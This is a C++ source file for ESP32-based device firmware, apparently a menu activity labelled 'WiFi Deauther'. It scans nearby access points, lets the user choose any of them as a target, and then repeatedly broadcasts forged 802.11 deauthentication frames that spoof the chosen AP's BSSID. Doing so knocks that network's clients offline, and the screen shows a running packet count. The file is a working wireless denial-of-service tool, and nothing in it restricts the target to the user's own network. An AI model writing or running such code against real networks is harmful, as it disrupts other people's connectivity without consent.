#include "WifiTestActivity.h"

#include <I18n.h>
#include <Logging.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <algorithm>
#include <string>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "util/RadioManager.h"

// Deauth frame template (26 bytes)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                          // Frame control: deauth
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP BSSID (filled in)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled in)
    0x00, 0x00,                          // Sequence
    0x01, 0x00                           // Reason: unspecified
};

void WifiTestActivity::onEnter() {
  Activity::onEnter();
  RADIO.ensureWifi();
  state = SCANNING;
  aps.clear();
  selectorIndex = 0;
  packetsSent = 0;

  // Check if raw TX is available
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_err_t err = esp_wifi_set_promiscuous(true);
  if (err == ESP_OK) {
    // Test raw TX with a dummy - if function exists, we're good
    rawTxAvailable = true;
    esp_wifi_set_promiscuous(false);
  } else {
    rawTxAvailable = false;
  }

  startScan();
  requestUpdate();
}

void WifiTestActivity::onExit() {
  Activity::onExit();
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  RADIO.shutdown();
}

void WifiTestActivity::startScan() {
  state = SCANNING;
  aps.clear();
  WiFi.scanDelete();
  WiFi.scanNetworks(true);
}

void WifiTestActivity::processScanResults() {
  int16_t result = WiFi.scanComplete();
  if (result == WIFI_SCAN_RUNNING) return;

  aps.clear();
  if (result > 0) {
    aps.reserve(result);
    for (int i = 0; i < result; i++) {
      AP ap;
      ap.ssid = WiFi.SSID(i).c_str();
      if (ap.ssid.empty()) ap.ssid = "(hidden)";
      ap.rssi = WiFi.RSSI(i);
      ap.channel = WiFi.channel(i);
      memcpy(ap.bssid, WiFi.BSSID(i), 6);
      aps.push_back(std::move(ap));
    }
    std::sort(aps.begin(), aps.end(), [](const AP& a, const AP& b) { return a.rssi > b.rssi; });
  }
  WiFi.scanDelete();
  state = SELECT_TARGET;
  requestUpdate();
}

bool WifiTestActivity::sendDeauthFrame(const uint8_t* bssid, uint8_t channel) {
  // Set channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Fill BSSID into frame
  memcpy(&deauthFrame[10], bssid, 6);  // Source
  memcpy(&deauthFrame[16], bssid, 6);  // BSSID

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
  return err == ESP_OK;
}

void WifiTestActivity::loop() {
  if (state == SCANNING) {
    processScanResults();
    return;
  }

  if (state == NOT_SUPPORTED) {
    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      finish();
    }
    return;
  }

  if (state == DEAUTHING) {
    unsigned long now = millis();
    if (now - lastSendTime >= 100) {
      lastSendTime = now;
      const auto& target = aps[targetIndex];
      if (sendDeauthFrame(target.bssid, target.channel)) {
        packetsSent++;
      }
      requestUpdate();
    }

    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      esp_wifi_set_promiscuous(false);
      state = SELECT_TARGET;
      requestUpdate();
    }
    return;
  }

  // SELECT_TARGET
  const int count = static_cast<int>(aps.size());

  buttonNavigator.onNext([this, count] {
    if (count > 0) {
      selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count);
      requestUpdate();
    }
  });

  buttonNavigator.onPrevious([this, count] {
    if (count > 0) {
      selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count);
      requestUpdate();
    }
  });

  if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
    if (!rawTxAvailable) {
      state = NOT_SUPPORTED;
      requestUpdate();
      return;
    }
    if (!aps.empty()) {
      targetIndex = selectorIndex;
      packetsSent = 0;
      startTime = millis();
      lastSendTime = 0;
      esp_wifi_set_promiscuous(true);
      state = DEAUTHING;
      requestUpdate();
    }
  }

  if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
    finish();
  }
}

void WifiTestActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  renderer.clearScreen();

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, tr(STR_WIFI_DEAUTHER));

  if (state == SCANNING) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2, tr(STR_SCANNING_WIFI));
    renderer.displayBuffer();
    return;
  }

  if (state == NOT_SUPPORTED) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2 - 15, "Raw TX not available");
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2 + 15, "on this hardware");
    const auto labels = mappedInput.mapLabels(tr(STR_BACK), "", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  if (state == DEAUTHING) {
    const auto& target = aps[targetIndex];
    const int leftPad = metrics.contentSidePadding;
    int y = metrics.topPadding + metrics.headerHeight + 40;

    renderer.drawCenteredText(UI_10_FONT_ID, y, tr(STR_TARGET), true, EpdFontFamily::BOLD);
    y += 30;
    renderer.drawCenteredText(UI_10_FONT_ID, y, target.ssid.c_str());
    y += 60;

    std::string pktStr = std::to_string(packetsSent);
    renderer.drawCenteredText(UI_10_FONT_ID, y, tr(STR_PACKETS_SENT), true, EpdFontFamily::BOLD);
    y += 40;
    renderer.drawCenteredText(UI_10_FONT_ID, y, pktStr.c_str(), true, EpdFontFamily::BOLD);
    y += 60;

    unsigned long elapsed = (millis() - startTime) / 1000;
    std::string timeStr = std::to_string(elapsed) + "s";
    renderer.drawCenteredText(UI_10_FONT_ID, y, timeStr.c_str());

    const auto labels = mappedInput.mapLabels(tr(STR_EXIT), "", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  // SELECT_TARGET
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;

  if (aps.empty()) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2, tr(STR_NO_ENTRIES));
  } else {
    GUI.drawList(
        renderer, Rect{0, contentTop, pageWidth, contentHeight}, static_cast<int>(aps.size()), selectorIndex,
        [this](int i) -> std::string { return aps[i].ssid; },
        [this](int i) -> std::string {
          return std::to_string(aps[i].rssi) + "dBm  Ch" + std::to_string(aps[i].channel);
        });
  }

  const auto labels = mappedInput.mapLabels(tr(STR_BACK), tr(STR_SELECT), "^", "v");
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
